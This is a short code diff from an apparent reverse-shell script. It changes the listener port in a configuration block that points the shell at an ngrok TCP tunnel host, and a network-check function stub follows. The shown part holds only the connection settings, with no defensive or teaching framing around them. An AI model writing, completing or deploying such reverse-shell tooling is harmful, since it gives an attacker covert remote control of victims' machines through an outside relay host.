@@ -2,7 +2,7 @@
 
 # Configuration for the reverse shell
 HOST="0.tcp.ap.ngrok.io"  # Update with your listener's IP address
-PORT="17370"  # Update with your listener's port number
+PORT="14619"  # Update with your listener's port number
 
 # Function to check network connectivity
 function check_network {
